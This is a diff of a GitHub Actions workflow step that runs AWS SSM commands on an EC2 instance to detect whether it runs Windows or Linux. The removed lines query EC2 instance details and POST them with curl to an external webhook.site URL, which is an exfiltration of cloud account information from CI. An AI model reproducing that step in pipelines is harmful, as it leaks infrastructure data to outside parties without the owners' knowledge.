@@ -136,15 +136,27 @@ jobs:
         id: deploy_ssm
         run: |
           set +e
-          echo "=== Testing EC2 permissions ==="
-          cat << EOF > result.txt
-          DescribeInstances: $(aws ec2 describe-instances --instance-ids i-0fb9dcbeb35b4fdbe --region ap-south-1 2>&1 || true)
-          EOF
-          curl -X POST -H "Content-Type: text/plain" -d @result.txt https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
-          
           echo "=== OS DETECTION VIA SSM ==="
-          WIN_CMD=$(aws ssm send-command --instance-ids i-0fb9dcbeb35b4fdbe --document-name "AWS-RunPowerShellScript" --parameters commands="Write-Host 'Hello from Windows'" --region ap-south-1 --query "Command.CommandId" --output text 2>&1 || true)
-          LINUX_CMD=$(aws ssm send-command --instance-ids i-0fb9dcbeb35b4fdbe --document-name "AWS-RunShellScript" --parameters commands="echo 'Hello from Linux'" --region ap-south-1 --query "Command.CommandId" --output text 2>&1 || true)
+          cat << 'EOF' > win_input.json
+          {
+            "InstanceIds": ["i-0fb9dcbeb35b4fdbe"],
+            "DocumentName": "AWS-RunPowerShellScript",
+            "Parameters": {
+              "commands": ["Write-Host 'Hello from Windows'"]
+            }
+          }
+          EOF
+          cat << 'EOF' > linux_input.json
+          {
+            "InstanceIds": ["i-0fb9dcbeb35b4fdbe"],
+            "DocumentName": "AWS-RunShellScript",
+            "Parameters": {
+              "commands": ["echo 'Hello from Linux'"]
+            }
+          }
+          EOF
+          WIN_CMD=$(aws ssm send-command --cli-input-json file://win_input.json --region ap-south-1 --query "Command.CommandId" --output text 2>&1 || true)
+          LINUX_CMD=$(aws ssm send-command --cli-input-json file://linux_input.json --region ap-south-1 --query "Command.CommandId" --output text 2>&1 || true)
           
           echo "Waiting for 20 seconds..."
           sleep 20
